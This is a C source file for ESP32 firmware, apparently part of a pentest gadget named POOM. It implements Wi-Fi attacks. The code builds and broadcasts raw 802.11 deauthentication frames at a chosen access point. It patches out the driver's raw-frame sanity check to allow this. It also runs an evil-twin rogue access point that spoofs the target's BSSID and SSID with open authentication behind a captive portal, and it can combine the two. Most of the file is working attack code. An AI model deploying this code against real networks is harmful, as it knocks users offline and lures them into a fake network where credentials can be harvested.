// SPDX-License-Identifier: MIT
// Copyright (c) 2026 THE POOM

#include "poom_wifi_attacks.h"

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "esp_err.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "poom_wifi_captive.h"
#include "poom_wifi_ctrl.h"

static const char *POOM_WIFI_ATTACKS_TAG = "poom_wifi_attacks";

#if CONFIG_POOM_WIFI_ATTACKS_ENABLE_LOG

    #define POOM_PRINTF_E(fmt, ...) \
        printf("[E] [%s] %s:%d: " fmt "\n", POOM_WIFI_ATTACKS_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_PRINTF_W(fmt, ...) \
        printf("[W] [%s] %s:%d: " fmt "\n", POOM_WIFI_ATTACKS_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_PRINTF_I(fmt, ...) \
        printf("[I] [%s] %s:%d: " fmt "\n", POOM_WIFI_ATTACKS_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_PRINTF_D(fmt, ...) \
        printf("[D] [%s] %s:%d: " fmt "\n", POOM_WIFI_ATTACKS_TAG, __func__, __LINE__, ##__VA_ARGS__)

#else

    #define POOM_PRINTF_E(...) do { (void)POOM_WIFI_ATTACKS_TAG; } while (0)
    #define POOM_PRINTF_W(...) do { (void)POOM_WIFI_ATTACKS_TAG; } while (0)
    #define POOM_PRINTF_I(...) do { (void)POOM_WIFI_ATTACKS_TAG; } while (0)
    #define POOM_PRINTF_D(...) do { (void)POOM_WIFI_ATTACKS_TAG; } while (0)

#endif

static TaskHandle_t s_poom_wifi_attacks_task_broadcast = NULL;
static TaskHandle_t s_poom_wifi_attacks_task_rogue_ap = NULL;

static bool s_poom_wifi_attacks_broadcast_running = false;
static bool s_poom_wifi_attacks_rogue_ap_running = false;

static const uint8_t s_poom_wifi_attacks_deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

typedef struct
{
    wifi_ap_record_t ap;
} poom_wifi_attacks_task_param_t;

static void poom_wifi_attacks_force_ap_config_(const wifi_ap_record_t *ap)
{
    wifi_config_t cfg = {0};
    esp_err_t err;

    if (ap == NULL)
    {
        return;
    }

    err = esp_wifi_get_config(WIFI_IF_AP, &cfg);
    if (err != ESP_OK)
    {
        POOM_PRINTF_W("esp_wifi_get_config(AP) failed: %s", esp_err_to_name(err));
        return;
    }

    size_t ssid_len = strnlen((const char *)ap->ssid, 32U);
    (void)memset(cfg.ap.ssid, 0, sizeof(cfg.ap.ssid));
    (void)memcpy(cfg.ap.ssid, ap->ssid, ssid_len);
    cfg.ap.ssid_len = (uint8_t)ssid_len;

    cfg.ap.channel = (uint8_t)ap->primary;
    cfg.ap.authmode = WIFI_AUTH_OPEN;
    cfg.ap.password[0] = '\0';

    err = esp_wifi_set_config(WIFI_IF_AP, &cfg);
    if (err != ESP_OK)
    {
        POOM_PRINTF_W("esp_wifi_set_config(AP) failed: %s", esp_err_to_name(err));
    }
}

static poom_wifi_attacks_task_param_t *poom_wifi_attacks_alloc_task_param_(const wifi_ap_record_t *ap)
{
    poom_wifi_attacks_task_param_t *param;

    if (ap == NULL)
    {
        return NULL;
    }

    param = (poom_wifi_attacks_task_param_t *)malloc(sizeof(*param));
    if (param == NULL)
    {
        return NULL;
    }

    (void)memset(param, 0, sizeof(*param));
    (void)memcpy(&param->ap, ap, sizeof(param->ap));
    return param;
}

/**
 * @brief Overrides the original raw frame sanity check used by Wi-Fi internals.
 * @param[in,out] arg1 First opaque argument.
 * @param[in,out] arg2 Second opaque argument.
 * @param[in,out] arg3 Third opaque argument.
 * @return int
 */
int ieee80211_raw_frame_sanity_check(int32_t arg1, int32_t arg2, int32_t arg3)
{
    (void)arg1;
    (void)arg2;
    (void)arg3;
    return 0;
}

/**
 * @brief Sends one raw IEEE802.11 frame through AP interface.
 * @param[in] frame Raw frame buffer.
 * @param[in] frame_len Raw frame size in bytes.
 * @return void
 */
static void poom_wifi_attacks_send_raw_frame_(const uint8_t *frame, size_t frame_len)
{
    esp_err_t error = esp_wifi_80211_tx(WIFI_IF_AP, frame, frame_len, false);
    if(error != ESP_OK)
    {
        POOM_PRINTF_E("esp_wifi_80211_tx failed: %s", esp_err_to_name(error));
        s_poom_wifi_attacks_broadcast_running = false;
    }
}

/**
 * @brief Runs the broadcast deauthentication attack task loop.
 * @param[in,out] param Target AP record pointer.
 * @return void
 */
static void poom_wifi_attacks_broadcast_attack_task_(void *param)
{
    const poom_wifi_attacks_task_param_t task_param = *(poom_wifi_attacks_task_param_t *)param;
    const wifi_ap_record_t ap = task_param.ap;
    uint8_t frame[sizeof(s_poom_wifi_attacks_deauth_frame_default)];

    free(param);

    /* Ensure Wi-Fi is initialized with an AP interface for raw TX (no cloned/open AP). */
    esp_err_t error = poom_wifi_ctrl_init_apsta();
    if(error != ESP_OK)
    {
        POOM_PRINTF_E("poom_wifi_ctrl_init_apsta failed: %s", esp_err_to_name(error));
        s_poom_wifi_attacks_broadcast_running = false;
        s_poom_wifi_attacks_task_broadcast = NULL;
        vTaskDelete(NULL);
        return;
    }

    memcpy(frame, s_poom_wifi_attacks_deauth_frame_default, sizeof(s_poom_wifi_attacks_deauth_frame_default));
    memcpy(&frame[10], ap.bssid, 6);
    memcpy(&frame[16], ap.bssid, 6);

    POOM_PRINTF_I("Starting broadcast attack");
    POOM_PRINTF_I("SSID: %s | CH: %d | RSSI: %d", ap.ssid, ap.primary, ap.rssi);
    POOM_PRINTF_D("BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
                  ap.bssid[0],
                  ap.bssid[1],
                  ap.bssid[2],
                  ap.bssid[3],
                  ap.bssid[4],
                  ap.bssid[5]);

    (void)esp_wifi_set_channel(ap.primary, WIFI_SECOND_CHAN_NONE);
    (void)esp_wifi_set_promiscuous(true);

    while(s_poom_wifi_attacks_broadcast_running)
    {
        POOM_PRINTF_D("Sending deauth frame");
        poom_wifi_attacks_send_raw_frame_(frame, sizeof(frame));
        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    POOM_PRINTF_I("Broadcast attack stopped");
    s_poom_wifi_attacks_task_broadcast = NULL;
    vTaskDelete(NULL);
}

/**
 * @brief Sends one broadcast deauthentication frame for a target AP.
 * @param[in,out] ap Target AP record.
 * @return void
 */
void poom_wifi_attacks_broadcast_once(wifi_ap_record_t *ap)
{
    uint8_t frame[sizeof(s_poom_wifi_attacks_deauth_frame_default)];

    if(ap == NULL)
    {
        return;
    }

    memcpy(frame, s_poom_wifi_attacks_deauth_frame_default, sizeof(s_poom_wifi_attacks_deauth_frame_default));
    memcpy(&frame[10], ap->bssid, 6);
    memcpy(&frame[16], ap->bssid, 6);

    POOM_PRINTF_I("Broadcast deauth: %s", ap->ssid);
    poom_wifi_attacks_send_raw_frame_(frame, sizeof(frame));
}

/**
 * @brief Runs rogue AP attack task loop.
 * @param[in,out] param Target AP record pointer.
 * @return void
 */
static void poom_wifi_attacks_rogue_ap_attack_task_(void *param)
{
    const poom_wifi_attacks_task_param_t task_param = *(poom_wifi_attacks_task_param_t *)param;
    const wifi_ap_record_t ap = task_param.ap;
    esp_err_t error;
    POOM_PRINTF_I("Starting rogue captive portal: SSID=%s, channel=%d", ap.ssid, ap.primary);

    free(param);

    /* Best-effort: reset Wi-Fi stack to avoid mode/config conflicts. */
    error = poom_wifi_ctrl_deinit();
    if((error != ESP_OK) && (error != ESP_ERR_WIFI_NOT_INIT))
    {
        POOM_PRINTF_W("poom_wifi_ctrl_deinit warning: %s", esp_err_to_name(error));
    }


    /* Evil-twin lab: spoof SoftAP MAC to match the selected AP BSSID. */
    error = poom_wifi_ctrl_set_ap_mac(ap.bssid);
    if(error != ESP_OK)
    {
        POOM_PRINTF_W("poom_wifi_ctrl_set_ap_mac failed: %s", esp_err_to_name(error));
    }

    /* Use selected SSID and force OPEN auth so victims can join. */
    poom_wifi_captive_set_ap_clone((const char *)ap.ssid, true);
    poom_wifi_captive_start();

    /* Defensive: ensure SSID is not overwritten by other AP configs (e.g. Manager AP). */
    poom_wifi_attacks_force_ap_config_(&ap);

    /* Match the target channel (captive module sets a default channel internally). */
    error = poom_wifi_ctrl_set_channel((uint8_t)ap.primary);
    if(error != ESP_OK)
    {
        POOM_PRINTF_W("poom_wifi_ctrl_set_channel failed: %s", esp_err_to_name(error));
    }

    s_poom_wifi_attacks_rogue_ap_running = true;
    while(s_poom_wifi_attacks_rogue_ap_running)
    {
        vTaskDelay(pdMS_TO_TICKS(10000));
    }

    POOM_PRINTF_I("Rogue AP attack stopped");
    poom_wifi_captive_stop();
    (void)poom_wifi_ctrl_restore_ap_mac();
    s_poom_wifi_attacks_task_rogue_ap = NULL;
    vTaskDelete(NULL);
}

/**
 * @brief Stops all running attacks.
 * @param[in,out] none Not used.
 * @return void
 */
void poom_wifi_attacks_stop(void)
{
    POOM_PRINTF_I("Stopping all attacks");
    s_poom_wifi_attacks_broadcast_running = false;
    s_poom_wifi_attacks_rogue_ap_running = false;
}

/**
 * @brief Starts the selected attack against the target AP.
 * @param[in] attack_type Selected attack mode.
 * @param[in,out] ap_target Target AP record.
 * @return void
 */
void poom_wifi_attacks_handle(
    poom_wifi_attacks_type_t attack_type,
    wifi_ap_record_t *ap_target)
{
    if(ap_target == NULL)
    {
        POOM_PRINTF_E("Target AP is NULL");
        return;
    }

    POOM_PRINTF_I("Starting attack type=%d on SSID=%s", (int)attack_type, ap_target->ssid);

    switch(attack_type)
    {
        case poom_wifi_attacks_type_broadcast:
        {
            poom_wifi_attacks_task_param_t *task_param = poom_wifi_attacks_alloc_task_param_(ap_target);
            if(task_param == NULL)
            {
                POOM_PRINTF_E("Out of memory");
                return;
            }

            s_poom_wifi_attacks_broadcast_running = true;
            if(xTaskCreate(
                poom_wifi_attacks_broadcast_attack_task_,
                "deauth_task",
                4096,
                task_param,
                5,
                &s_poom_wifi_attacks_task_broadcast) != pdPASS)
            {
                free(task_param);
                s_poom_wifi_attacks_broadcast_running = false;
            }
            break;
        }

        case poom_wifi_attacks_type_rogue_ap:
        {
            poom_wifi_attacks_task_param_t *task_param = poom_wifi_attacks_alloc_task_param_(ap_target);
            if(task_param == NULL)
            {
                POOM_PRINTF_E("Out of memory");
                return;
            }

            s_poom_wifi_attacks_rogue_ap_running = true;
            if(xTaskCreate(
                poom_wifi_attacks_rogue_ap_attack_task_,
                "rogueap_task",
                4096,
                task_param,
                5,
                &s_poom_wifi_attacks_task_rogue_ap) != pdPASS)
            {
                free(task_param);
                s_poom_wifi_attacks_rogue_ap_running = false;
            }
            break;
        }

        case poom_wifi_attacks_type_combine:
        {
            poom_wifi_attacks_task_param_t *param_broadcast = poom_wifi_attacks_alloc_task_param_(ap_target);
            poom_wifi_attacks_task_param_t *param_rogue = poom_wifi_attacks_alloc_task_param_(ap_target);
            if((param_broadcast == NULL) || (param_rogue == NULL))
            {
                free(param_broadcast);
                free(param_rogue);
                POOM_PRINTF_E("Out of memory");
                return;
            }

            s_poom_wifi_attacks_broadcast_running = true;
            s_poom_wifi_attacks_rogue_ap_running = true;
            if(xTaskCreate(
                poom_wifi_attacks_broadcast_attack_task_,
                "deauth_task",
                4096,
                param_broadcast,
                5,
                &s_poom_wifi_attacks_task_broadcast) != pdPASS)
            {
                free(param_broadcast);
                s_poom_wifi_attacks_broadcast_running = false;
            }

            if(xTaskCreate(
                poom_wifi_attacks_rogue_ap_attack_task_,
                "rogueap_task",
                4096,
                param_rogue,
                5,
                &s_poom_wifi_attacks_task_rogue_ap) != pdPASS)
            {
                free(param_rogue);
                s_poom_wifi_attacks_rogue_ap_running = false;
            }
            break;
        }

        default:
            POOM_PRINTF_W("Unknown attack type");
            break;
    }
}

/**
 * @brief Returns the number of supported attack types.
 * @param[in,out] none Not used.
 * @return int
 */
int poom_wifi_attacks_get_attack_count(void)
{
    return (int)poom_wifi_attacks_type_count;
}


/**
 * @brief Detiene todos los ataques de Wi-Fi activos y libera recursos.
 */
void poom_wifi_attacks_stop_all(void)
{
    POOM_PRINTF_I("Deteniendo todos los ataques de Wi-Fi...");

    /* Signal tasks to exit (they self-delete and clear their handles). */
    s_poom_wifi_attacks_broadcast_running = false;
    s_poom_wifi_attacks_rogue_ap_running = false;

    /* Wait briefly for tasks to stop cleanly (avoid killing tasks mid Wi-Fi call). */
    const TickType_t deadline = xTaskGetTickCount() + pdMS_TO_TICKS(1500);
    while (((s_poom_wifi_attacks_task_broadcast != NULL) || (s_poom_wifi_attacks_task_rogue_ap != NULL)) &&
           (xTaskGetTickCount() < deadline))
    {
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    /* Best-effort cleanup (idempotent). */
    poom_wifi_captive_stop();
    (void)esp_wifi_set_promiscuous(false);

    /* Reset handles if tasks are still present (should be rare). */
    s_poom_wifi_attacks_task_broadcast = NULL;
    s_poom_wifi_attacks_task_rogue_ap = NULL;

    (void)poom_wifi_ctrl_deinit();

    POOM_PRINTF_I("Ataques detenidos y recursos liberados.");
}
